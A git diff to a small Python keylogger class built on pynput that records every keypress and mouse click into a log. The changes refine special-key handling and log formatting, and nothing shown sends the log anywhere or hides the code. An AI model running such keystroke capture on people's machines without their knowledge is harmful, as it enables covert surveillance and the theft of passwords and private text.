@@ -1,14 +1,13 @@
-from pynput.keyboard import Listener as KeyboardListener
+from pynput.keyboard import Listener as KeyboardListener, Key
 from pynput.mouse import Listener as MouseListener
 import asyncio
-from pynput.keyboard import Key
 
 
 class Keylogger:
     def __init__(self):
         self.log = ""
         self.exit_event = asyncio.Event()  
-
+        self.lastEventIsClick = False
 
 
     def on_press(self,key):
@@ -21,8 +20,10 @@ class Keylogger:
             Key.shift: 'Shift',
             Key.shift_r: 'Shift',
             Key.ctrl: 'Ctrl',
+            Key.ctrl_l: 'Ctrl',
             Key.ctrl_r: 'Ctrl',
             Key.alt: 'Alt',
+            Key.alt_l: 'Alt',
             Key.alt_r:'Alt',
             Key.cmd: 'Cmd',
             Key.cmd_r: 'Cmd',
@@ -44,7 +45,7 @@ class Keylogger:
             if special_keys[key] == 'Space':
                 self.log+=' '
 
-            elif special_keys[key] == 'Backspace':
+            elif special_keys[key] == 'Backspace' and not self.lastEventIsClick:
                 self.log = self.log[0:-1]
 
             elif special_keys[key] == 'Enter':
@@ -57,7 +58,7 @@ class Keylogger:
                 self.log=''
             
             else:
-                self.log+= f'[{special_keys[key].upper()}]'
+                self.log+= f'\n[{special_keys[key].upper()}] '
             
         else:
             try:
@@ -68,6 +69,9 @@ class Keylogger:
             except AttributeError:
                 print(f'on_press {key} type: {type(key)}')
 
+        self.lastEventIsClick = False
+
+
     def on_release(self,key):
         pass
         #print('on_release')
@@ -75,6 +79,7 @@ class Keylogger:
     def on_click(self,x, y, button, pressed):
         # Tu lógica aquí para manejar el evento de clic
         print(f'Click en ({x}, {y}) con el botón {button}, Presionado: {pressed}')
+        self.lastEventIsClick = True
 
     async def listenKeyboard(self):
         with KeyboardListener(on_press=self.on_press, on_release=self.on_release) as keyboard_listener:
